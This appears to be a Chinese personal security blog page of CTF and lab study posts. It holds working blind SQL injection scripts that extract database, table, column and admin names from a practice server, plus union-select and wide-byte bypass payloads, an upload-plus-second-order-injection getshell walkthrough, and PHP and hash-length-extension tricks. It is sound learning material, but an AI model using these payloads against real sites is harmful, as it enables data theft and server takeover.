        <h2 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入"></a>布尔型注入</h2><p>在过滤了union，仅存select这个关键词的时候，或者是返回并没有显示位时，那我们应该如何使用别的查询语句来查询我们所要的信息呢？或者是我们无法看到之前我们需要的回显位了，那么这个时候我们可以考虑<strong>第一种思路—-布尔型注入</strong>。<br>简而言之，布尔型注入就是判断你查询的语句是否为真，再通过夹逼的方式确定那个值是什么。这就需要用到几个函数了。<br>exists():用于检查子查询是否有返回数据。结果是ture或者false<br>ascii():把字符转化成ascii码<br>substr():substr（string string，num start，num length）截断一部分字符串，偏移从1开始，并不是0<br>count():记录出现的次数<br>接下来在实例中讲解一下布尔型注入的基本思路<br><img src="/images/8/1.png" alt=""><br>这里可以试试我们的联合查询是否可以得到我们想要的结果<img src="/images/8/2.png" alt="">在这里发现并不行，根本没有回显位，所以联合查询的方式肯定是不行的。所以我们考虑使用布尔型注入来试试。试了一个最基本的判断。</p>
<blockquote>
<p><a href="http://47.94.13.75/edu/payload/sql/bool.php?id=1%27%20and%20%28select%20length%28database%28%29%29%3E1%29%20--+" target="_blank" rel="noopener">http://47.94.13.75/edu/payload/sql/bool.php?id=1%27%20and%20%28select%20length%28database%28%29%29%3E1%29%20--+</a>  </p>
</blockquote>
<p><img src="/images/8/3.png" alt="">这时发现回显正常页面说明，我们可以判断数据库的第一个字符的ascii码&gt;1，虽然这没什么实际的意义，但是它提示了我们可以使用布尔型注入来试出数据库的名称。直接用脚本跑吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8  </span><br><span class="line">import string  </span><br><span class="line">import requests  </span><br><span class="line">database = &quot;&quot;  </span><br><span class="line">for i in range(1,10):  </span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and (select(length(database())&gt;%d)) --+&quot; % (i)  </span><br><span class="line">    r1 = requests.get(url)  </span><br><span class="line">    if &quot;you are in .....&quot; not in r1.content:  </span><br><span class="line">        length = i  </span><br><span class="line">        break  </span><br><span class="line">for i in range(1,length+1):  </span><br><span class="line">    for j in range(65,123):  </span><br><span class="line">        url2 =   &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and (select ascii(substr(database(),%d,1))&gt;%d) --+&quot; %(i,j)  </span><br><span class="line">        r2 = requests.get(url2)  </span><br><span class="line">        if &quot;you are in .....&quot; not in r2.content:  </span><br><span class="line">            database = database + chr(j)  </span><br><span class="line">            break  </span><br><span class="line">     length = length + 1  </span><br><span class="line">print database</span><br></pre></td></tr></table></figure></p>
<p>跑出数据库名称为edutest，然后接着下一步去查询表名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">tb = &quot;&quot;</span><br><span class="line">tablename = []</span><br><span class="line">for i in range(1,10):</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select count(table_name) from information_schema.tables where table_schema=0x65647574657374 ) &gt; %d) --+&quot; % (i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if &quot;you are in .....&quot; not in r1.content:</span><br><span class="line">        number = i</span><br><span class="line">        break</span><br><span class="line">print number  #数据库数量</span><br><span class="line">for i in range(0,number):</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select length(table_name) from information_schema.tables where table_schema=0x65647574657374 limit %d,1) &gt; %d) --+&quot; % (i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if &quot;you are in .....&quot; not in r2.content:</span><br><span class="line">            length = j</span><br><span class="line">            break</span><br><span class="line">    for k in range(1,length+1):</span><br><span class="line">        for m in range(65,123):</span><br><span class="line">                url3 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select ascii(substr(table_name,%d,1)) from information_schema.tables where table_schema=0x65647574657374 limit %d,1) &gt; %d) --+&quot; %(k ,i ,m)</span><br><span class="line">                r3 = requests.get(url3)</span><br><span class="line">                if &quot;you are in .....&quot; not in r3.content:</span><br><span class="line">                    tb = tb + chr(m)</span><br><span class="line">                    break</span><br><span class="line">    tablename.append(tb)</span><br><span class="line">    tb = &quot;&quot; #清除前面的字符串</span><br><span class="line">print tablename</span><br></pre></td></tr></table></figure></p>
<p>得到以下四个数据库的表名  </p>
<blockquote>
<p>[‘admin_logs’, ‘admins’, ‘facebook’, ‘message’]  </p>
</blockquote>
<p>接着继续爆破列名，以admin_logs为例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">cl = &quot;&quot;</span><br><span class="line">columnname = []</span><br><span class="line">for i in range(1,10):</span><br><span class="line">    url = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select count(column_name) from information_schema.columns where table_name=0x61646d696e5f6c6f6773 ) &gt; %d) --+&quot; % (i)</span><br><span class="line">    r1 = requests.get(url)</span><br><span class="line">    if &quot;you are in .....&quot; not in r1.content:</span><br><span class="line">        number = i</span><br><span class="line">        break</span><br><span class="line">print number  #列数</span><br><span class="line">for i in range(0,number):</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        url2 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select length(column_name) from information_schema.columns where table_name=0x61646d696e5f6c6f6773 limit %d,1) &gt; %d) --+&quot; % (i,j)</span><br><span class="line">        r2 = requests.get(url2)</span><br><span class="line">        if &quot;you are in .....&quot; not in r2.content:</span><br><span class="line">            length = j</span><br><span class="line">            break</span><br><span class="line">    for k in range(1,length+1):</span><br><span class="line">        for m in range(65,123):</span><br><span class="line">                url3 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and ((select ascii(substr(column_name,%d,1)) from information_schema.columns where table_name=0x61646d696e5f6c6f6773 limit %d,1) &gt; %d) --+&quot; %(k ,i ,m)  </span><br><span class="line">                r3 = requests.get(url3)</span><br><span class="line">                if &quot;you are in .....&quot; not in r3.content:</span><br><span class="line">                    cl = cl + chr(m)</span><br><span class="line">                    break</span><br><span class="line">    columnname.append(cl)</span><br><span class="line">    cl = &quot;&quot; #清除前面的字符串</span><br><span class="line">print columnname</span><br></pre></td></tr></table></figure></p>
<p>我们爆破得出下面这几个列名  </p>
<blockquote>
<p>[‘id’, ‘admin’, ‘ip’, ‘addtime’]  </p>
</blockquote>
<p>接着直接查询字段内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">adminname = []</span><br><span class="line">adm = &quot;&quot;</span><br><span class="line">for i in range(99,105): #我测试了一下发现admin有100000个以上，所以在这里就直接爆破第99到104个</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        url = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and (length((select admin from admin_logs limit %d,1)) &gt; %d) --+&quot; %(i,j)</span><br><span class="line">        r1 = requests.get(url)</span><br><span class="line">        if &quot;you are in .....&quot; not in r1.content:</span><br><span class="line">            length = j</span><br><span class="line">            break</span><br><span class="line">    for k in range(1,length+1):</span><br><span class="line">        for m in range(65,123): #测试了一下不仅仅是A之后的字符</span><br><span class="line">            url2 = &quot;http://47.94.13.75/edu/payload/sql/bool.php?id=1&apos; and (select ascii(substr((select admin from admin_logs limit %d,1),%d,1)) &gt; %d) --+&quot; %(i,k,m)</span><br><span class="line">            r2 = requests.get(url2)</span><br><span class="line">            if &quot;you are in .....&quot; not in r2.content:</span><br><span class="line">                adm = adm + chr(m)</span><br><span class="line">                break</span><br><span class="line">    adminname.append(adm)</span><br><span class="line">    adm = &quot;&quot;</span><br><span class="line">print adminname</span><br></pre></td></tr></table></figure></p>
<p>爆破出用户名</p>
<blockquote>
<p>[‘fgd’, ‘Artgr’, ‘das’, ‘dddddddddddd’, ‘AAAAAA’, ‘vAdcvAcv’]  </p>
</blockquote>
<p>这是最基本的流程，在一些细节的地方还需要多多去尝试，bypass的手段还需要练习。   </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/04/29/sql注入之布尔型注入/" data-id="cjn3ccggi000xbkve027ofu0q" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-关于sql注入的一些学习心得" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/04/21/关于sql注入的一些学习心得/" class="article-date">
  <time class="post-time" datetime="2018-04-21T01:26:22.000Z" itemprop="datePublished">
    <span class="post-month">4月</span><br/>
    <span class="post-day">21</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/04/21/关于sql注入的一些学习心得/">关于sql注入的一些学习心得</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习-sql注入/">日常学习 sql注入</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>说实话，很久以前就有着想归纳sql注入的冲动了，但是自己的实力不够，对mysql不太了解，对于一些sql注入的题目也是一知半解，久而久之就开始对sql注入产生了逃避以及厌恶之情，最近慢慢的才发现，不会sql注入那和我吉他不会大横按一样，所以我最近恶补了一些sql注入方面的知识，写在这里一方面是为了分享一下自己的学习心得，另一方面，则是为我自己做个笔记。</p>
<h2 id="sql基础知识"><a href="#sql基础知识" class="headerlink" title="sql基础知识"></a>sql基础知识</h2><p>初入sql注入呢，我们需要了解一下我们进行sql注入的目的是什么，以及如何使用sql注入来达到我们需要得到的效果。<br>sql注入是我们通过我们自己可控的输入恶意的插入一些代码执行语句来使得源代码错误的执行我们的语句从而反馈给我们一些有用的信息。sql注入主要的原因是因为在使用php与mysql进行交互的时候，代码写得不严谨或是过滤不太完整。<br>那如何通过sql注入的注入点来读取数据库的一些信息呢？目前主要接触到的有以下几种注入：<br><strong>1</strong>   get形注入，我们在测试的时候，关注一下网站的url如何出现了形如:</p>
<blockquote>
<p>  <a href="http://www.xxxxxx.xxx/?id=x" target="_blank" rel="noopener">www.xxxxxx.xxx/?id=x</a>  </p>
</blockquote>
<p>这时我们就可以考虑sql注入了。<br><strong>2</strong>   post形注入，如果网站直接给你一个输入框那可以考虑考虑post形的注入<br><strong>3</strong>   cookies注入，这一种主要是通过抓包观察cookies的一些规律，如果出现一些特殊的cookies类型那可以考虑试试构造sql语句的cookies来进行注入<br><strong>4</strong>   其他类型的注入，比如在headers里面的一些参数可以进行注入，通过x-forwarded-for构造ip来进行注入  </p>
<h2 id="sql注入的基础函数"><a href="#sql注入的基础函数" class="headerlink" title="sql注入的基础函数"></a>sql注入的基础函数</h2><p>user() ：当前使用者的用户名<br>database()：当前数据库名<br>version()：数据库版本<br>datadir：读取数据库的绝对路径<br>@@vasedir：mysql安装路径<br>@@version_compile_os：操作系统<br>concat()：连接一个或者多个字符串<br>group_concat()：连接一个组的所有字符串，并以逗号分隔每一条数据<br>length()：返回字符串的长度<br>substr()：截取字符串<br>mid()：截取字符串<br>ascii()：返回字符的ascii码<br>sleep()： 函数延迟代码执行若干秒  </p>
<h2 id="sql注入的基础语句"><a href="#sql注入的基础语句" class="headerlink" title="sql注入的基础语句"></a>sql注入的基础语句</h2><p><strong>1  万能语句</strong>  </p>
<blockquote>
<p> ‘ or ‘1’=’1 #<br>admin’) #</p>
</blockquote>
<p>类似这种短小的语句是在sql注入前先试试的，不过绝大部分的网站是不可能有这种注入给我们利用的。只可能在做题里面用到。<br><strong>2  union语句</strong></p>
<blockquote>
<p> union select * from where  </p>
</blockquote>
<p>这是我们最基本的一种查询语句。一般这种注入方式叫做联合查询注入方式。<br><strong>ps</strong> 我也只会知道这两种，其他的会后续补上。  </p>
<h2 id="sql注入基本流程"><a href="#sql注入基本流程" class="headerlink" title="sql注入基本流程"></a>sql注入基本流程</h2><p><strong>1</strong>  首先自然是观察哪里可能存在注入点，上述我们提到的四种可能存在注入的地方需要特别注意，接下来以get形式注入为例子进行操作。<br><strong>2</strong>  碰到像这种应该测试一下是什么类型的注入</p>
<blockquote>
<p>xxxx/?id=1</p>
</blockquote>
<p>我们可以这样来判断这是什么类型  </p>
<blockquote>
<p>xxxx/?id=1 and 1=1<br>xxxx/?id=1 and 1=2  </p>
</blockquote>
<p>如果第一次返回正常，第二次返回错误，或者不返回，那么可以判断这是数字型的注入，那如两次都是错误那就可以判断是字符型注入了，这只是一种区分方式，感兴趣可以去百度一波。区分不同类型对我们注入是有所帮助的。<br><strong>3</strong>  如果判断为了字符型注入，那么我们接下去查询它的列数，如果我们后面查询的列数与数据库的列数不同，那么是无法正常显示我们查询的东西的。一般具体的查询我们是通过<strong>order by</strong>来查询的。  </p>
<blockquote>
<p>xxxx/?id=1’ order by x –+  </p>
</blockquote>
<p>这样一直试，知道可以判断x为止。然后再判断其显示位</p>
<blockquote>
<p>xxxx/?id=-1’ union select 1,2…,x –+  </p>
</blockquote>
<p>注意id我们需要赋一个数据库不存在的值，这样才能显示我们要查的内容，不然的话，原来的数据可能会覆盖掉我们查询的内容。此刻回显的数字即为显示位。<br><strong>4</strong> 这个时候我们就可以利用显示位和联合查询来依次爆破数据库名，表名，列名，字段了(以2为显示位)。  </p>
<blockquote>
<p>xxxx/?id=-1’ union select 1，database()….. –+  或者 union select 1,schema_name… from information_schema.schemata –+<br>xxxx/?id=-1’ union select 1,table_name… from information_schema.tables where table_schema=’库名’ –+<br>xxxx/?id=-1’ union select 1,column_name… from information_schema.columns where table_name=’表名’ –+<br>xxxx/?id=-1’ union select 1,列名… from 表名 –+  </p>
</blockquote>
<p>由于在查询的时候会有很多表名列名，但是返回的数据只有一条，那我们怎么办呢?<br><strong>第一</strong>我们可以使用<strong>limit m,1</strong>这个语句，作用是限制查询为第m+1条数据，我们可以通过多次查询出所有结果，或者还可以使用<strong>limit n offset m</strong>，这个语句则是查询第m条数据之后的n条数据。<br><strong>第二</strong>我们可以使用concat()，以及group_concat()或是concat_ws()函数来把所查询的内容连接成字符串输出。  </p>
<h3 id="这些都是最基本的操作，如果在某些题目中出现过滤某些关键词的话，我们可以考虑通过绕过来注入，这是借鉴大师傅bypass的一些思路的地址：http-www-cnblogs-com-joy-nick-p-5774462-html"><a href="#这些都是最基本的操作，如果在某些题目中出现过滤某些关键词的话，我们可以考虑通过绕过来注入，这是借鉴大师傅bypass的一些思路的地址：http-www-cnblogs-com-joy-nick-p-5774462-html" class="headerlink" title="这些都是最基本的操作，如果在某些题目中出现过滤某些关键词的话，我们可以考虑通过绕过来注入，这是借鉴大师傅bypass的一些思路的地址：http://www.cnblogs.com/joy-nick/p/5774462.html"></a>这些都是最基本的操作，如果在某些题目中出现过滤某些关键词的话，我们可以考虑通过绕过来注入，这是借鉴大师傅bypass的一些思路的地址：<a href="http://www.cnblogs.com/joy-nick/p/5774462.html" target="_blank" rel="noopener">http://www.cnblogs.com/joy-nick/p/5774462.html</a></h3><p><strong>接下来是一些过滤了关键词但是可以注入的其他方式。</strong></p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在某些加了转义的sql语句中，我们无法通过’或是”闭合语句来达到我们的目的，但是如果网站使用了GBK编码的话，我们是可以通过  </p>
<blockquote>
<p>%df%27  </p>
</blockquote>
<p>来构造一个’闭合语句的，因为GBK编码是双字节编码，也就是说，如果我们构造了与%5c相关的编码，那么前两个编码会被识别为一个字符也就是汉字，然后我们的%27就被独立了出来，这是一个实例<img src="/images/7/1.png" alt="">这样就成功绕过了转义语句构造出了我们需要的’<br>接着跟着流程走就行了，但是值得注意的一点是在后面这句查询语句<strong>where table_schema=’表名’</strong>应该使用<strong>where table_schema =数据库十六进制</strong>来代替。  </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/04/21/关于sql注入的一些学习心得/" data-id="cjn3ccgh30017bkvehjr69w9g" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-sql注入/">Web sql注入</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-初试Getshell" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/04/11/初试Getshell/" class="article-date">
  <time class="post-time" datetime="2018-04-11T14:13:44.000Z" itemprop="datePublished">
    <span class="post-month">4月</span><br/>
    <span class="post-day">11</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/04/11/初试Getshell/">初试Getshell</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="文件管理系统"><a href="#文件管理系统" class="headerlink" title="文件管理系统"></a>文件管理系统</h3><p>在很久很久以前就想日站了，奈何自己的动力不足，一拖再拖导致现在的水平和其他人差距拉开太大了，不过庆幸的是在塔主的带领下，终于开始踏入了神秘的Getshell领域了。Getshell主要的手段就是上传文件，里面的文件需要具备这几个特点:<img src="/images/6/8.png" alt="">。根据塔主的提示，一般文件上传漏洞的思路如下：<img src="/images/6/6.png" alt="">  <img src="/images/6/7.png" alt="">要深入理解也只能实际操作才能得到效果。<br>第一天的网站:<a href="http://202.98.28.108:10014/2sdrewe4543sd/" target="_blank" rel="noopener">http://202.98.28.108:10014/2sdrewe4543sd/</a><br>在给了网站的同时，网站的源码也给了出来。这个就有点白盒审计的味道了。然后还给了一个hint，flag在SERVER_ADMIN下，也就是说我们传上一个包含phpinfo()函数的php文件然后让服务器解析执行就能得到flag了。<br>首先打开网址<img src="/images/6/1.png" alt="">毕竟是个给我们做题的网站，所以自然是有点简陋的了。观察网站发现有这么几个功能。<br><img src="/images/6/2.png" alt="">第一个是上传文件的功能，根据提示应该是只能上传图片文件，也就是说后缀名只能是jpg,png等等。的确在后面代码审计upload.php的时候发现了这个网站通过白名单验证限制了用户上传文件的类型<br><img src="/images/6/3.png" alt=""><br>接着看看rename的功能<br><img src="/images/6/4.png" alt=""><br>给出两个文本框一个要更名的文件名，一个更名后新的文件名，值得注意的是这里只是单纯的更改前面的文件名而已，并不能更改文件的后缀名，也就是说我们没办法通过把1.txt改成1.php来绕过Getshell。另一个删除功能并没有什么卵用，当然有用我也不会用。。。。<br>接下来查看源码看看用没有什么可以利用的东西。首先审计基础配置的文件—common.inc.php文件，<strong>一个主要的注意点</strong><img src="/images/6/5.png" alt="">由于加了addslashes()函数那么在参数方面注入是不太可能的（宽字节注入另当别论）所以可以考虑其他的方向。<br>审计一波主要的upload.php函数，发现有以下几个值得注意的地方<img src="/images/6/9.png" alt="">这里使用了白名单过滤，上面提过就不再提了，另外值得注意的地方是文件储存的方式，网站使用了两个数组来分别储存文件名和它所对应的后缀名。这就导致了我们无法通过00截断来绕过。而且这里也使用了addslashes()函数通过文件名来进行注入也是不可能的。<br>不过这个网站真的没用可以利用的地方了吗？这是不太可能的，接着往下看<img src="/images/6/10.png" alt="">这里是存在注入漏洞的，在更新插入的时候我们可以构造一个类似的语句来达到一些不可告人的目的。<br>接下来看看rename.php这个文件，这个文件是我们Getshell的关键<img src="/images/6/11.png" alt="">这里是从数据库中直接查询调用出来并没有经过什么过滤了，所以我们可以利用更新的语句进行二次注入。<img src="/images/6/12.png" alt="">这一段代码给我们提供了一个我们无法更改后缀名的信息，综合这以上的代码，可以分析出以下思路：<br>第一，我们需要上传一个php的文件让服务器解析，但是php的文件后缀名并不在白名单里面，所以问题简化为如何绕过过滤来达到我们想要的效果。<br>所以，我们需要使得我们一开始上传的图片类型文件更改为.php的文件，但是在更名文件里面，文件名和后缀名分开独立，我们无法达到更改后缀名的效果，那怎么办呢？其实还是有利用的地方的，还记得上面这个更新语句吗？<img src="/images/6/10.png" alt="">如果我们一开始上传的文件名是一个注入语句，那么我们是可以利用这一点把文件的后缀名更改为空的，然后更新文件名为我们的木马，那就可以通过后缀名为空来更改我们上传木马的后缀。<br>我们需要两个文件，一个文件的文件名是我们注入语句的文件名也就是<strong>‘,extension=’’,filename=’1000.jpg.jpg</strong>通过这个语句插进更新语句那就是这种效果:</p>
<blockquote>
<pre><code>update `file` set `filename`=&apos;1000.jpg&apos;, `oldname`=&apos;&apos;,extension=&apos;&apos;,filename=&apos;1000.jpg&apos; where `fid`={$result[&apos;fid&apos;]}  
</code></pre><p>也就是说我们已经更新了数据库，有了一个1000.jpg.空的文件了，这样我们随意取一个名字，只要不和我们上传的重名例如250.jpg那就是说我们之前的文件上传为了250.jpg.jpg<br>那我们之前不是插入了一个1000.jpg.空的文件吗，这行代码有一点干扰<img src="/images/6/13.png" alt="">在查询的时候数据库需要一个1000.jpg的文件，也就是说我们需要再上传一个1000.jpg的文件，在这个文件里写入我们的phpinfo()函数，再通过rename功能把我们的1000.jpg.空改为1000.php.空，此时解析的就是1000.php也就是说成功解析了我们上传的shell文件，打开<a href="http://202.98.28.108:10014/2sdrewe4543sd/upload/1000.php" target="_blank" rel="noopener">http://202.98.28.108:10014/2sdrewe4543sd/upload/1000.php</a>就可以读出这个网站php的版本以及我们flag的信息了。<br>总体来说，这一次的Getshell让我学到了很多东西，一些基本的思路在之后会用挺大用处的，特别是一个bypass的思想，这个在之后做渗透测试的时候会很有帮助，希望能坚持下去，学习到更多的东西。</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/04/11/初试Getshell/" data-id="cjn3ccghj001hbkves44p1nso" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-shell/">web shell</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-0x05-在蓝鲸打卡所学到的基本操作（Web篇）" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/03/22/0x05-在蓝鲸打卡所学到的基本操作（Web篇）/" class="article-date">
  <time class="post-time" datetime="2018-03-22T13:19:11.000Z" itemprop="datePublished">
    <span class="post-month">3月</span><br/>
    <span class="post-day">22</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/03/22/0x05-在蓝鲸打卡所学到的基本操作（Web篇）/">0x05 在蓝鲸打卡所学到的基本操作（Web篇）</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#神奇的php在CTF中的各种花式操作<br>总所周知，php是一门强大的脚本语言，主要用于后端开发，在Web方面主要是作为网页与数据库交互的桥梁，也就是说，后端人员通过php来处理表单提供的数据来与数据库匹配，然后决定下一步的操作，也可以作为用户使用网站储存文件的钥匙，不过这一般都是攻击者用来盗取网站信息的工具，这也侧面说明php的功能十分的强大，用好了就可以对网站为所欲为。今天主要归纳几道涉及到PHP的题目。</p>
<h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><p>在我们所学的编程语言中，例如C,C++,Java等语言，如果我们需要使用一个变量，必须先定义这个变量，而在一些高级语言也就是PHP，Python等语言中是可以不必定义变量的，也就是说我们可以不必定义一个变量（也就是先初始化）直接赋值。方便之余也带了一些潜在的危害。<br>在网络交互时使用PHP时，即使没有$x=$_Get[‘x’]这个语句我们依旧可以通过get传参这个变量名从而覆盖原变量的值。具体一些函数例如Extract()，$$使用不当之类引起的变量覆盖问题就不细谈了,直接看实例吧:<br><img src="/images/5/1.jpg" alt=""><br>分析所得到的源代码，发现要求我们通过file_get_contents()函数输入一个文件，这个通过php://input这个函数通过POST数据来进行赋值，所以题目Payload为  </p>
<blockquote>
<p>   ?vs=s878926199a&amp;Ff=php://input    </p>
</blockquote>
<p>然后把s214587387aPOST传参给Ff完成使得两者相等得到Flag。  </p>
<p><strong>php应用太广了，所以，未完待续。。。。。。。。。。。。</strong></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/03/22/0x05-在蓝鲸打卡所学到的基本操作（Web篇）/" data-id="cjn3ccg820004bkvebgwlniiq" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-PHP/">Web PHP</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-0x04-在蓝鲸打卡所学到的基本操作（Web篇）" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/03/14/0x04-在蓝鲸打卡所学到的基本操作（Web篇）/" class="article-date">
  <time class="post-time" datetime="2018-03-14T02:17:13.000Z" itemprop="datePublished">
    <span class="post-month">3月</span><br/>
    <span class="post-day">14</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/03/14/0x04-在蓝鲸打卡所学到的基本操作（Web篇）/">0x04 在蓝鲸打卡所学到的基本操作(Web篇)</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Hash长度拓展攻击"><a href="#Hash长度拓展攻击" class="headerlink" title="Hash长度拓展攻击"></a>Hash长度拓展攻击</h3><p>今天来归纳一波比较难理解的Hash长度拓展攻击。<br>首先在了解如何攻击之前，先理解一下sha1是如何进行加密的：<img src="/images/4/0.png" alt=""><br>我第一次看到这个流程图的时候也是一脸懵逼，这对于一个密码学刚刚入门的人来说真的是太难了，花了很久的时间我才明白这个的原理：<br>首先是处理输入的字符串，如果输入的字符串字节数(<strong>注意！是字节数！</strong>)除余64是56，那么在后8位填充长度描述符具体用bit表示(<strong>这里字节的长度要用16进制来表示，前后颠倒之后再填充进去，也是常说的小端储存</strong>)，如果除余之后不是56，那么会自动填充一个\x80和N个\x00知道余数为56，然后加上后八位的长度描述符，可以分成多少组64位就进行多少次的复杂操作，具体的算法就不细说了。<img src="/images/4/1.jpg" alt=""><br>在处理的时候，会根据四组确定值的初始值(也称初始向量IV值)来计算这一轮的sha1值，然后再根据计算出的sha1值来替代初始的那四组值，再进行下一轮的计算，如果最终生成64位的sha1值那么这个就作为最终的sha1值输出。<br>接下来就是如何利用这个机制了，我们只需要知道如下几个条件就可以进行攻击了:<img src="/images/4/2.jpg" alt=""><br>第一步，把我们知道的salt和message经过sha1之后的值拆分为四组，每一组分别把前后的值颠倒，作为即将加密的IV值。<br>第二步，打开计算MD5的脚本，把初始向量IV值更改为上一步得到的IV值，输入message，填充至56位，然后再加上长度描述符，最后加上要拓展攻击的字符，运行脚本，输出的结果就为salt+拓展攻击的md5值。<br><a 